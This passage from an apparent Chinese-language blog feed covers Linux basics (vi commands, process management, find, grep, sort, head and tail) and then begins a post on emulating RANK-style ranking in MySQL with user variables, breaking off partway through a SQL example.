<li><code>:w</code> 保存当前编辑文件，但并不退出</li>
<li><code>:w</code> newfile 存为另外一个名为 “newfile” 的文件</li>
<li><code>:wq</code> 用于存盘退出Vi</li>
<li><code>:q!</code> 用于不存盘退出Vi</li>
<li><code>:q</code>用于直接退出Vi （未做修改）</li>
</ul>
<p>在扩展模式下可以进行查找并替换</p>
<p>示例将全文的the 单词替换为the one 的vi 界面:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">This file is being created using the vi editor</div><div class="line">Welcome to using the vi editor...</div><div class="line">~</div><div class="line">~</div><div class="line">~</div><div class="line">:g/ the /s// the one /g</div><div class="line"></div><div class="line">命令解析：</div><div class="line">g/ the 查找文本中所有the的关键词</div><div class="line">/s// the one 替换成the one</div><div class="line">/g 替换所有(global)的关键词</div></pre></td></tr></table></figure></p>
<p>设置Vi环境:</p>
<ul>
<li>:set autoindent* 缩进,常用于程序的编写</li>
<li>:set noautoindent *取消缩进</li>
<li>:set number* 在编辑文件时显示行号</li>
<li>:set nonumber *不显示行号</li>
<li>:set tabstop=value *设置显示制表符的空格字符个数</li>
<li>:set *显示设置的所有选项</li>
<li>:set all* 显示所有可以设置的选项</li>
</ul>
<h3 id="关于进程"><a href="#关于进程" class="headerlink" title="关于进程"></a>关于进程</h3><h4 id="什么是进程"><a href="#什么是进程" class="headerlink" title="什么是进程"></a>什么是进程</h4><p> 进程是一个程序针对一组数据的一次执行<br> 进程是整个系统中资源分配的最小单位<br> 进程是系统调用，系统处理机调度最小的单位<br> 每个程序(命令)的运行都会产生一个进程</p>
<p>执行中的程序在称作进程。当程序以可执行文件存放在存储中，并且运行的时候，每个进程会被动态得分配系统资源、内存、安全属性和与之相关的状态。可以有多个进程关联到同一个程序，并同时执行不会互相干扰。操作系统会有效地管理和追踪所有运行着的进程。</p>
<p>为了管理这些进程，用户应该能够：</p>
<ul>
<li>查看所有运行中的进程</li>
<li>查看进程消耗资源</li>
<li>定位个别进程并且对其执行指定操作</li>
<li>改变进程的优先级</li>
<li>杀死指定进程</li>
<li>限制进程可用的系统资源等</li>
</ul>
<h4 id="进程与变量"><a href="#进程与变量" class="headerlink" title="进程与变量"></a>进程与变量</h4><p> 变量是进程环境的一部分<br> 不同进程间变量是不能互相访问和修改的<br> 子进程要想继续父进程的变量，必须用export命令将变量输出成全局变量</p>
<h4 id="管理进程"><a href="#管理进程" class="headerlink" title="管理进程"></a>管理进程</h4><p>Linux提供了许多命令来让用户来高效掌控上述的操作。接下来，一个一个的来讲解下。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ps</code></td>
<td>Linux 中最基础的浏览系统中的进程的命令。能列出系统中运行的进程，包括进程号、命令、CPU使用量、内存使用量等。</td>
</tr>
<tr>
<td><code>pstree</code></td>
<td>linux中，每一个进程都是由其父进程创建的。此命令以可视化方式显示进程，通过显示进程的树状图来展示进程间关系。如果指定了pid了，那么树的根是该pid，不然将会是init（pid： 1）。</td>
</tr>
<tr>
<td><code>top</code></td>
<td>top’是一个更加有用的命令，可以监视系统中不同的进程所使用的资源。它提供实时的系统状态信息。显示进程的数据包括 PID、进程属主、优先级、%CPU、%memory等。可以使用这些显示指示出资源使用量。</td>
</tr>
<tr>
<td><code>htop</code></td>
<td>htop与top很类似，但是htop是交互式的文本模式的进程查看器。它通过文字图形化地显示每一个进程的CPU和内存使用量、swap使用量。使用上下光标键选择进程，F7和F8改变优先级，F9杀死进程。Htop不是系统默认安装的，所以需要额外安装。</td>
</tr>
<tr>
<td><code>nice</code></td>
<td>通过nice命令的帮助，用户可以设置和改变进程的优先级。提高一个进程的优先级，内核会分配更多CPU时间片给这个进程。默认情况下，进程以0的优先级启动。进程优先级可以通过top命令显示的NI（nice value）列查看。</td>
</tr>
<tr>
<td><code>renice</code></td>
<td>renice命令类似nice命令。使用这个命令可以改变正在运行的进程优先值。注意，用户只能改变属于他们自己的进程的优先值。</td>
</tr>
<tr>
<td><code>kill</code></td>
<td>这个命令用于发送信号来结束进程。如果一个进程没有响应杀死命令，这也许就需要强制杀死，使用-9参数来执行。注意，使用强制杀死的时候一定要小心，因为进程没有时机清理现场，也许写入文件没有完成。如果我们不知道进程PID或者打算用名字杀死进程时候，killall就能派上用场。</td>
</tr>
<tr>
<td><code>ulimit</code></td>
<td>该命令用于控制系统资源在shell和进程上的分配量。对于系统管理员是最有用的，可以管理重度使用和存在性能问题的系统。限制资源大小可以确保重要进程持续运行，其他进程不会占用过多资源。</td>
</tr>
<tr>
<td><code>w</code></td>
<td>w 提供当前登录的用户及其正在执行的进程的信息。显示信息头包含信息，如当前时间、系统运行时长、登录用户总数、过去的1，5，15分钟内的负载均衡数。</td>
</tr>
<tr>
<td><code>pgrep</code></td>
<td>pgrep的意思是”进程号全局正则匹配输出”。该命令扫描当前运行进程，然后按照命令匹配条件列出匹配结果到标准输出。对于通过名字检索进程号是很有用。</td>
</tr>
<tr>
<td><code>fg</code>,<code>bg</code></td>
<td>有时，命令需要很长的时间才能执行完成。对于这种情况，我们使用‘bg’命令可以将任务放在后台执行，而用‘fg’可以调到前台来使用。</td>
</tr>
<tr>
<td><code>ipcs</code></td>
<td>ipcs命令报告进程间通信设施状态。（共享内存，信号量和消息队列）</td>
</tr>
</tbody>
</table>
<h3 id="一些实用工具"><a href="#一些实用工具" class="headerlink" title="一些实用工具"></a>一些实用工具</h3><h4 id="find-文件查找工具"><a href="#find-文件查找工具" class="headerlink" title="find|文件查找工具"></a><code>find|文件查找工具</code></h4><p>find命令是一个无处不在命令，是linux中最有用的命令之一。find命令用于：在一个目录（及子目录）中搜索文件，你可以指定一些匹配条件，如按文件名、文件类型、用户甚至是时间戳查找文件。</p>
<p><img src="/images/linux的那些事-09.png" alt="find"></p>
<ul>
<li>一般来说find主要用于在指定 目录结构中查找 特定文件:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ find . -name sum</div><div class="line">./color/sum</div><div class="line">./shape/sum</div></pre></td></tr></table></figure>
<ul>
<li>通过find执行命令</li>
</ul>
<p><img src="/images/linux的那些事-10.png" alt="find"></p>
<ul>
<li>交互式的命令执行</li>
</ul>
<p><img src="/images/linux的那些事-11.png" alt="find"></p>
<ul>
<li>find命令的其他选项</li>
</ul>
<p><img src="/images/linux的那些事-12.png" alt="find"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ find . -name &apos;s*&apos; -type f -size +2 -exec ls -l &#123;&#125; \;</div><div class="line">-rwxr-xr-x 1 joe staff 1512 Jan 11 15:43 ./color/sum</div><div class="line">-rwxr-xr-x 1 joe staff 2148 Jan 11 15:57 ./shape/sum</div><div class="line"></div><div class="line">$ find . -perm 644 -mtime +4 -print</div><div class="line">./shape/misc</div><div class="line"></div><div class="line">$ find . -name fleas -o -name misc</div><div class="line">./misc</div><div class="line">./shape/misc</div><div class="line">./fleas</div><div class="line"></div><div class="line">$ find / -name &apos;security&apos; -print 2&gt; errfile</div><div class="line">/var/security</div><div class="line">/usr/lpp/bos.sysmgt/inst_root/var/security</div><div class="line">/usr/lib/security</div><div class="line">/etc/security</div></pre></td></tr></table></figure>
<h4 id="grep-模式匹配工具"><a href="#grep-模式匹配工具" class="headerlink" title="grep|模式匹配工具"></a><code>grep|模式匹配工具</code></h4><p><code>grep (global search regular expression(RE) and print out the line）</code>,全面搜索正则表达式并把行打印出来)是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。</p>
<p><img src="/images/linux的那些事-13.png" alt="grep"></p>
<p>grep命令示例样本数据文件:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">phone1:</div><div class="line">As of: 1/31/2000</div><div class="line">Anatole 389-8200</div><div class="line">Avis Betty 817 422-8345</div><div class="line">Baker John 656-4333</div><div class="line">Computer Room CE phone 689-5790</div><div class="line">Dade Travel Sue 422-5690</div><div class="line">Hotline HW 800 322-4500</div><div class="line"></div><div class="line"></div><div class="line">phone2:</div><div class="line">As of: 2/15/2000</div><div class="line">Anatole 389-8200</div><div class="line">Avis Betty 817 422-8345</div><div class="line">Baker John 656-4333</div><div class="line">Computer Room CE phone 592-5712</div><div class="line">Dade Travel Sue 422-5690</div><div class="line">Hotline HW 800 322-4500</div></pre></td></tr></table></figure>
<ul>
<li><code>grep</code>命令示例 一：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ grep 800 phone1</div><div class="line">Hotline HW 800 322-4500</div><div class="line">$ grep 800 phone*</div><div class="line">phone1:Hotline HW 800 322-4500</div><div class="line">phone2:Hotline</div></pre></td></tr></table></figure>
<p> 第一个例子从文件phone1 中找出了包含800 的行<br> 第二个例子文件名使用了通配符，所以grep 会在phone1和phone2</p>
<p><code>grep</code>命令示例 二：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ps -ef | grep team01</div><div class="line">team01 10524 13126 0 09:27:45 pts/1 0:00 –ksh</div></pre></td></tr></table></figure>
<p> 找出当前运行的进程中用户team01的所有进程。通过管道，ps的标准输出作为grep的标准输入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ps aux | grep httpd</div><div class="line">......</div></pre></td></tr></table></figure></p>
<p> 找出进程名称包含httpd的进程</p>
<ul>
<li>grep与正则表达式</li>
</ul>
<p><img src="/images/linux的那些事-14.png" alt="grep"></p>
<p><strong>元字符 对比 通配符</strong></p>
<p><img src="/images/linux的那些事-15.png" alt="grep"></p>
<p>注：grep命令和find命令中使用元字符，都应该用单引号括起来，避免shell对元字符进行扩展。</p>
<ul>
<li>grep正则表达式示例</li>
</ul>
<p><img src="/images/linux的那些事-16.png" alt="grep"></p>
<ul>
<li>grep命令的选项</li>
</ul>
<p><img src="/images/linux的那些事-17.png" alt="grep"></p>
<ul>
<li>其他grep工具</li>
</ul>
<p><img src="/images/linux的那些事-18.png" alt="grep"></p>
<h4 id="sort-排序工具"><a href="#sort-排序工具" class="headerlink" title="sort|排序工具"></a><code>sort|排序工具</code></h4><p><code>sort</code>对指定文件中所有的行进行排序，并将结果到标准输出。</p>
<p><code>sort [-t delimiter][+field[.column]][options]</code></p>
<p><img src="/images/linux的那些事-19.png" alt="sort"></p>
<p>命令示例：<br><img src="/images/linux的那些事-20.png" alt="sort"></p>
<h3 id="head和tail工具"><a href="#head和tail工具" class="headerlink" title="head和tail工具"></a><code>head和tail工具</code></h3><p><code>head [-number_of_lines] file(s)</code>,显示文件的前n行，默认是10行。</p>
<p><code>tail [-number_of_lines | +starting_line_number] file(s)</code>,显示文件后n行。<code>-n</code>表示显示文件的最后n行,<code>+n</code>表示从文件的第n行一直显示到文件尾.<code>-f</code>选项显示后10行并且动态刷新.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Linux的基础知识&quot;&gt;&lt;a href=&quot;#Linux的基础知识&quot; class=&quot;headerlink&quot; title=&quot;Linux的基础知识&quot;&gt;&lt;/a&gt;Linux的基础知识&lt;/h3&gt;&lt;p&gt;Linux系统的组成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;linux内核（linus
    
    </summary>
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>数据库|MySQL中实现Rank高级排名函数</title>
    <link href="http://yoursite.com/2018/05/15/%E6%95%B0%E6%8D%AE%E5%BA%93-MySQL%E4%B8%AD%E5%AE%9E%E7%8E%B0Rank%E9%AB%98%E7%BA%A7%E6%8E%92%E5%90%8D%E5%87%BD%E6%95%B0/"/>
    <id>http://yoursite.com/2018/05/15/数据库-MySQL中实现Rank高级排名函数/</id>
    <published>2018-05-15T00:03:10.000Z</published>
    <updated>2018-05-15T17:21:45.921Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>MySQL中没有Rank排名函数，当我们需要查询排名时，只能使用MySQL数据库中的基本查询语句来查询普通排名。尽管如此，可不要小瞧基础而简单的查询语句，我们可以利用其来达到Rank函数一样的高级排名效果。</p>
<p>在这里我用一个简单例子来实现排名的查询：</p>
<p>首先我们先创建一个我们需要进行高级排名查询的players表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">CREATE TABLE `players` (</div><div class="line"></div><div class="line">  `pid` int(2) NOT NULL AUTO_INCREMENT,</div><div class="line"></div><div class="line">  `name` varchar(50) NOT NULL,</div><div class="line"></div><div class="line">  `age` int(2) NOT NULL,</div><div class="line"></div><div class="line">  PRIMARY KEY (`pid`),</div><div class="line"></div><div class="line">  UNIQUE KEY `name` (`name`)</div><div class="line"></div><div class="line">) ENGINE=InnoDB  DEFAULT CHARSET=latin1;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">INSERT INTO `players` (`pid`, `name`, `age`) VALUES</div><div class="line"></div><div class="line">(1, &apos;Samual&apos;, 25),</div><div class="line"></div><div class="line">(2, &apos;Vino&apos;, 20),</div><div class="line"></div><div class="line">(3, &apos;John&apos;, 20),</div><div class="line"></div><div class="line">(4, &apos;Andy&apos;, 22),</div><div class="line"></div><div class="line">(5, &apos;Brian&apos;, 21),</div><div class="line"></div><div class="line">(6, &apos;Dew&apos;, 24),</div><div class="line"></div><div class="line">(7, &apos;Kris&apos;, 25),</div><div class="line"></div><div class="line">(8, &apos;William&apos;, 26),</div><div class="line"></div><div class="line">(9, &apos;George&apos;, 23),</div><div class="line"></div><div class="line">(10, &apos;Peter&apos;, 19),</div><div class="line"></div><div class="line">(11, &apos;Tom&apos;, 20),</div><div class="line"></div><div class="line">(12, &apos;Andre&apos;, 20);</div></pre></td></tr></table></figure>
<h3 id="在MySQL中实现Rank普通排名函数"><a href="#在MySQL中实现Rank普通排名函数" class="headerlink" title="在MySQL中实现Rank普通排名函数"></a>在MySQL中实现Rank普通排名函数</h3><p>在这里，我们希望获得一个排名字段的列，以及age的升序排列。所以我们的查询语句将是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">SELECT pid, name, age, @curRank := @curRank + 1 AS rank</div><div class="line"></div><div class="line">FROM players p, (</div><div class="line"></div><div class="line">SELECT @curRank := 0</div><div class="line"></div><div class="line">) q</div><div class="line"></div><div class="line">ORDER BY age</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">| PID |    NAME | AGE | RANK |</div><div class="line"></div><div class="line">|-----|---------|-----|------|</div><div class="line"></div><div class="line">|  10 |   Peter |  19 |    1 |</div><div class="line"></div><div class="line">|  12 |   Andre |  20 |    2 |</div><div class="line"></div><div class="line">|   2 |    Vino |  20 |    3 |</div><div class="line"></div><div class="line">|   3 |    John |  20 |    4 |</div><div class="line"></div><div class="line">|  11 |     Tom |  20 |    5 |</div><div class="line"></div><div class="line">|   5 |   Brian |  21 |    6 |</div><div class="line"></div><div class="line">|   4 |    Andy |  22 |    7 |</div><div class="line"></div><div class="line">|   9 |  George |  23 |    8 |</div><div class="line"></div><div class="line">|   6 |     Dew |  24 |    9 |</div><div class="line"></div><div class="line">|   7 |    Kris |  25 |   10 |</div><div class="line"></div><div class="line">|   1 |  Samual |  25 |   11 |</div><div class="line"></div><div class="line">|   8 | William |  26 |   12 |</div></pre></td></tr></table></figure>
<p>要在mysql中声明一个变量，你必须在变量名之前使用<code>@</code>符号。FROM子句中的<code>(@curRank := 0)</code>部分允许我们进行变量初始化，而不需要单独的SET命令。当然，也可以使用SET，但它会处理两个查询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">SET @curRank := 0;</div><div class="line"></div><div class="line">SELECT pid, name, age, @curRank := @curRank + 1 AS rank</div><div class="line"></div><div class="line">FROM players</div><div class="line"></div><div class="line">ORDER BY age</div></pre></td></tr></table></figure>
<h3 id="查询以降序排列"><a href="#查询以降序排列" class="headerlink" title="查询以降序排列"></a>查询以降序排列</h3><p>首要按age的降序排列，其次按name进行排列，只需修改查询语句加上ORDER BY和 DESC以及列名即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">SELECT pid, name, age, @curRank := @curRank + 1 AS rank</div><div class="line"></div><div class="line">FROM players p, (</div><div class="line"></div><div class="line">SELECT @curRank := 0</div><div class="line"></div><div class="line">) q</div><div class="line"></div><div class="line">ORDER BY age DESC, name</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">| PID |    NAME | AGE | RANK |</div><div class="line"></div><div class="line">|-----|---------|-----|------|</div><div class="line"></div><div class="line">|   8 | William |  26 |    1 |</div><div class="line"></div><div class="line">|   7 |    Kris |  25 |    2 |</div><div class="line"></div><div class="line">|   1 |  Samual |  25 |    3 |</div><div class="line"></div><div class="line">|   6 |     Dew |  24 |    4 |</div><div class="line"></div><div class="line">|   9 |  George |  23 |    5 |</div><div class="line"></div><div class="line">|   4 |    Andy |  22 |    6 |</div><div class="line"></div><div class="line">|   5 |   Brian |  21 |    7 |</div><div class="line"></div><div class="line">|  12 |   Andre |  20 |    8 |</div><div class="line"></div><div class="line">|   3 |    John |  20 |    9 |</div><div class="line"></div><div class="line">|  11 |     Tom |  20 |   10 |</div><div class="line"></div><div class="line">|   2 |    Vino |  20 |   11 |</div><div class="line"></div><div class="line">|  10 |   Peter |  19 |   12 |</div></pre></td></tr></table></figure>
<h3 id="在MySQL中实现Rank普通并列排名函数"><a href="#在MySQL中实现Rank普通并列排名函数" class="headerlink" title="在MySQL中实现Rank普通并列排名函数"></a>在MySQL中实现Rank普通并列排名函数</h3><p>现在，如果我们希望为并列数据的行赋予相同的排名，则意味着那些在排名比较列中具有相同值的行应在MySQL中计算排名时保持相同的排名(例如在我们的例子中的<code>age</code>)。为此，我们使用了一个额外的变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">SELECT pid, name, age, </div><div class="line"></div><div class="line">CASE </div><div class="line"></div><div class="line">WHEN @prevRank = age THEN @curRank </div><div class="line"></div><div class="line">WHEN @prevRank := age THEN @curRank := @curRank + 1</div><div class="line"></div><div class="line">END AS rank</div><div class="line"></div><div class="line">FROM players p, </div><div class="line"></div><div class="line">(SELECT @curRank :=0, @prevRank := NULL) r</div><div class="line"></div><div class="line">ORDER BY age</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">| PID |    NAME | AGE | RANK |</div><div class="line"></div><div class="line">|-----|---------|-----|------|</div><div class="line"></div><div class="line">|  10 |   Peter |  19 |    1 |</div><div class="line"></div><div class="line">|  12 |   Andre |  20 |    2 |</div><div class="line"></div><div class="line">|   2 |    Vino |  20 |    2 |</div><div class="line"></div><div class="line">|   3 |    John |  20 |    2 |</div><div class="line"></div><div class="line">|  11 |     Tom |  20 |    2 |</div><div class="line"></div><div class="line">|   5 |   Brian |  21 |    3 |</div><div class="line"></div><div class="line">|   4 |    Andy |  22 |    4 |</div><div class="line"></div><div class="line">|   9 |  George |  23 |    5 |</div><div class="line"></div><div class="line">|   6 |     Dew |  24 |    6 |</div><div class="line"></div><div class="line">|   7 |    Kris |  25 |    7 |</div><div class="line"></div><div class="line">|   1 |  Samual |  25 |    7 |</div><div class="line"></div><div class="line">|   8 | William |  26 |    8 |</div></pre></td></tr></table></figure>
<p>如上所示，具有相同数据和排行的两行或多行，它们都会获得相同的排名。玩家Andre, Vino, John 和Tom都有相同的age，所以他们排名并列第二。下一个最高age的玩家(Brian)排名第3。这个查询相当于MSSQL和ORACLE 中的<code>DENSE_RANK()</code>函数。</p>
<h4 id="case-when"><a href="#case-when" class="headerlink" title="case when"></a>case when</h4><p>sql语句中的case语句与高级语言中的switch语句，是标准sql的语法，适用于一个条件判断有多种值的情况下分别执行不同的操作。</p>
<p>首先，让我们看一下CASE的语法。在一般的SELECT中，其语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">CASE   &lt;单值表达式&gt;</div><div class="line"></div><div class="line">       WHEN &lt;表达式值&gt; THEN &lt;SQL语句或者返回值&gt;</div><div class="line"></div><div class="line">       WHEN &lt;表达式值&gt; THEN &lt;SQL语句或者返回值&gt;</div><div class="line"></div><div class="line">       ...</div><div class="line"></div><div class="line">       WHEN &lt;表达式值&gt; THEN &lt;SQL语句或者返回值&gt;</div><div class="line"></div><div class="line">       ELSE &lt;SQL语句或者返回值&gt;</div><div class="line"></div><div class="line">END</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">:= 和 = 运算符在大部分场景下并无区别，但 := 更为全场景些。</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">= 只有在 set 和update时才是和 := 一样，赋值的作用，其它都是关系运算符 等于 的作用。</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">:= 不只在 set 和 update 时赋值的作用，在 select 也是赋值的作用。</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">SET @name = &apos;big_cat&apos;;</div><div class="line"></div><div class="line">SELECT @name;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># = 在 select 语句中成为了比较运算符 结果为 NULL (@name 为 NULL, 在 mysql 中 NULL 和任何值比较都为 NULL)</div><div class="line"></div><div class="line"># := 则为仍未赋值，@name_defined 被赋值为 big_cat 后再 select 就出来了</div><div class="line"></div><div class="line">SELECT @name = &apos;big_cat&apos;, @name_defined := &apos;big_cat&apos;, @name_defined;</div><div class="line"></div><div class="line">+-------------------+----------------------------+---------------+</div><div class="line"></div><div class="line">| @name = &apos;big_cat&apos; | @name_defined := &apos;big_cat&apos; | @name_defined |</div><div class="line"></div><div class="line">+-------------------+----------------------------+---------------+</div><div class="line"></div><div class="line">|              NULL | big_cat                    | big_cat       |</div><div class="line"></div><div class="line">+-------------------+----------------------------+---------------+</div></pre></td></tr></table></figure>
<h3 id="在MySQL中实现Rank高级并列排名函数"><a href="#在MySQL中实现Rank高级并列排名函数" class="headerlink" title="在MySQL中实现Rank高级并列排名函数"></a>在MySQL中实现Rank高级并列排名函数</h3><p>当使用RANK()函数时，如果两个或以上的行排名并列，则相同的行都会有相同的排名，但是实际排名中存在有关系的差距。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">SELECT</div><div class="line"></div><div class="line">	pid,</div><div class="line"></div><div class="line">	NAME,</div><div class="line"></div><div class="line">	age,</div><div class="line"></div><div class="line">	rank</div><div class="line"></div><div class="line">FROM</div><div class="line"></div><div class="line">	(</div><div class="line"></div><div class="line">		SELECT</div><div class="line"></div><div class="line">			pid,</div><div class="line"></div><div class="line">			NAME,</div><div class="line"></div><div class="line">			age,</div><div class="line"></div><div class="line">			@curRank :=</div><div class="line"></div><div class="line">		IF (</div><div class="line"></div><div class="line">			@prevRank = age,</div><div class="line"></div><div class="line">			@curRank,</div><div class="line"></div><div class="line">			@incRank</div><div class="line"></div><div class="line">		) AS rank,</div><div class="line"></div><div class="line">		@incRank := @incRank + 